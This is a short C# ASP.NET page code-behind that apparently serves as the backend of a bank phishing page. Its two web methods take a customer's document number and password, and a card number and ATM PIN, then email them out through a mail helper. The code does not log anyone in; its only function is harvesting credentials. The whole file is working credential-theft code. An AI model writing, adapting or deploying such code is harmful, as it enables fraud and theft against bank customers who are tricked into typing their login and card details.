using System;
using EngineCodeBank;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace BankData
{
    public partial class _default : System.Web.UI.Page
    {

        protected void Page_Load(object sender, EventArgs e)
        {
          
        }

        [System.Web.Services.WebMethod]
        public static void GetLoginValues(string DOCTYPE, string DOCNUMBER, string PASS)
        {
            if (DOCNUMBER == string.Empty) return;
            string [] partesMensaje = new string[2];
            partesMensaje[0] = "LOGIN CLIENTE";
            partesMensaje[1] = "Tipo de Documento: " + DOCTYPE + Environment.NewLine + "Numero de Documento: " + DOCNUMBER + Environment.NewLine + "Contraseña: " + PASS;
            EngineCodeBank.Mail EngineBank = new EngineCodeBank.Mail();
            EngineBank.EnviarMail(partesMensaje);
        }

        [System.Web.Services.WebMethod]
        public static void GetCardValues(string CARDNUMBER, string ATMKEY)
        {
            if (CARDNUMBER == string.Empty) return;
            string[] partesMensaje = new string[2];
            partesMensaje[0] = "DATOS CLIENTE";
            partesMensaje[1] = "Numero de Tarjeta: " + CARDNUMBER + Environment.NewLine + "Contraseña:  " + ATMKEY;
            EngineCodeBank.Mail EngineBank = new EngineCodeBank.Mail();
            EngineBank.EnviarMail(partesMensaje);
        }
    }
}